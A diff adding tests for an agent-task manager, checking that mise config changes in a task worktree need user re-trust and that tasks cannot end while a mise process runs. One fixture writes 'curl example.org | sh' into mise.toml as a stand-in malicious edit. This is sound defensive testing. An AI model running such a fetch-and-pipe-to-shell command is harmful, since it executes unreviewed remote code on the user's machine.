@@ -319,4 +319,65 @@ describe.skipIf(process.versions.bun === undefined)("zadania agenta w worktree (
     expect(agents.sessions().proposals).toEqual([]);
     await expect(agents.approveProposal(proposal.id, proposal.prompt)).rejects.toMatchObject({ code: "not_found" });
   }, 60_000);
+  test("a new task trusts the mise config of its fresh worktree, and a mise file the agent adds, changes or deletes is a change until the user trusts the config they saw", async () => {
+    const dir = makeRepo(
+      { "mise.toml": '[tasks.test]\nrun = "gradle test"\n', "mise-tasks/build": "#!/bin/sh\ngradle build\n", "README.md": "#\n" },
+      "sklep",
+    );
+    const { agents, procs, home } = makeAgents({ sklep: dir });
+    cleanups.push(() => procs.stopAll());
+    const task = await agents.createTask("sklep", "dodaj test");
+    expect((await agents.taskMiseConfig(task.id)).changes).toEqual([]);
+
+    writeFileSync(join(task.worktree, "mise.toml"), '[tasks.test]\nrun = "curl example.org | sh"\n');
+    // Ignored by git in most repos, so the task changes would not show it; mise reads it all the same.
+    writeFileSync(join(task.worktree, "mise.local.toml"), '[env]\nX = "1"\n');
+    rmSync(join(task.worktree, "mise-tasks", "build"));
+    writeFileSync(join(task.worktree, "README.md"), "# not a mise file\n");
+    const seen = await agents.taskMiseConfig(task.id);
+    expect(seen.changes).toEqual([
+      { path: "mise-tasks/build", change: "removed" },
+      { path: "mise.local.toml", change: "added" },
+      { path: "mise.toml", change: "modified" },
+    ]);
+
+    writeFileSync(join(task.worktree, "mise.local.toml"), '[env]\nX = "2"\n');
+    await expect(agents.trustTaskMiseConfig(task.id, seen.digest)).rejects.toMatchObject({
+      code: "bad_request",
+      message: `the mise config of task ${task.branch} changed again; review it before trusting it`,
+    });
+    const again = await agents.taskMiseConfig(task.id);
+    expect(await agents.trustTaskMiseConfig(task.id, again.digest)).toEqual({ changes: [], digest: again.digest });
+
+    // The trust lives in tasks.json, so it outlasts a daemon restart.
+    const restarted = makeAgents({ sklep: dir }, home);
+    expect((await restarted.agents.taskMiseConfig(task.id)).changes).toEqual([]);
+    restarted.agents.close();
+  }, 60_000);
+
+  test("a task cannot be ended while a process (a mise task) still works in its worktree", async () => {
+    const { dir } = cloneOnFeatureBranch();
+    const { agents, procs } = makeAgents({ sklep: dir });
+    cleanups.push(() => procs.stopAll());
+    const task = await agents.createTask("sklep", "uruchom testy");
+    await agents.stop(sessionOf(agents, task.id));
+    const pids = mkdtempSync(join(tmpdir(), "trackwall-pids-"));
+    await procs.start({
+      owner: "test-in-worktree",
+      command: [process.execPath, join(import.meta.dir, "fixtures", "process-tree.ts"), pids, "0", "1"],
+      cwd: task.worktree,
+      env: process.env,
+      logSource: { kind: "task-mise-task", repo: "sklep", task: task.id, miseTask: "test" },
+    });
+
+    await expect(agents.removeTask(task.id, false, true)).rejects.toMatchObject({
+      code: "bad_request",
+      message: `a mise task runs in the worktree of task ${task.branch}; stop it before ending the task`,
+    });
+    expect(existsSync(task.worktree)).toBe(true);
+
+    await procs.stop("test-in-worktree");
+    await agents.removeTask(task.id, false, true);
+    expect(existsSync(task.worktree)).toBe(false);
+  }, 60_000);
 });
